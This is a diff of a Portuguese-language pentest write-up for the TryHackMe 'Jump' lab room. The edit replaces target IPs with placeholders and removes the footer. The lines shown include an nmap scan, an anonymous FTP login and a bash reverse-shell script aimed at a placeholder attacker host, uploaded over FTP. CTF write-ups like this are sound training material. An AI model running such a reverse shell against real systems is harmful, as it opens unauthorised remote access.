@@ -1,9 +1,9 @@
 # Relatório de Pentest — Sala Jump (TryHackMe)
 
-**Alvo:** `10.65.163.178`
+**Alvo:** `Ip da Maquina`
 **Serviços:** FTP (21), SSH (22)
 **Objetivo:** Escalar de `recon_user` até `root`
-**Resultado:** ✅ Concluído — todas as flags capturadas
+**Resultado:** Concluído — todas as flags capturadas
 
 ---
 
@@ -26,7 +26,7 @@ Cada etapa da cadeia depende de uma configuração incorreta ou permissão exces
 ### 1.1 Scan de portas
 
 ```bash
-nmap -sV -p- **.**.***.***
+nmap -sV -p- <Ip da maquina>
 ```
 
 **Resultado:** apenas portas **21 (FTP)** e **22 (SSH)** abertas.
@@ -34,7 +34,7 @@ nmap -sV -p- **.**.***.***
 ### 1.2 Enumeração do FTP
 
 ```bash
-ftp **.**.***.***
+ftp <Ip da maquina>
 # Login: anonymous
 # Senha: (vazia)
 ```
@@ -76,14 +76,14 @@ Na máquina atacante (Kali):
 ```bash
 cat > shell.sh << 'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/**.**.***.***/4444 0>&1
+bash -i >& /dev/tcp/<Ip>/<Porta> 0>&1
 EOF
 ```
 
 ### 2.3 Upload via FTP
 
 ```bash
-ftp **.**.***.***
+ftp <Ip>
 # anonymous / (enter)
 cd incoming
 put shell.sh
@@ -453,6 +453,3 @@ O ponto-chave é a **enumeração cuidadosa** em cada etapa — verificar `id`, 
 
 ---
 
-**Relatório gerado em:** 2026-10-07
-**Analista:** [seu nome]
-**Ambiente:** TryHackMe — Sala Jump
